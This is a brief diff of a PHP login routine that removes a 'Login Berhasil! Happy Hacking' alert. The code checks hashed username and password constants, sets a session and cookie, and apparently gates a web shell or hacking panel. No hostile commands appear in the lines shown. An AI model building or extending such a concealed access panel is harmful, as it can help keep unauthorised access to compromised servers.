@@ -357,9 +357,6 @@ if (isset($_POST['btn-login'])) {
     $password = $_POST['password'];
     if (password_verify($username, THIS_USER)) {
         if (password_verify($password, THIS_PASS)) {
-            echo '<script>
-                alert("Login Berhasil!\nHappy Hacking:)");
-            </script>';
             $_SESSION["login"] = "login";
             setcookie(THIS_USER.'-logined', $my_self, time() + 3600 * 24);
             echo '<script>location.reload()</script>';
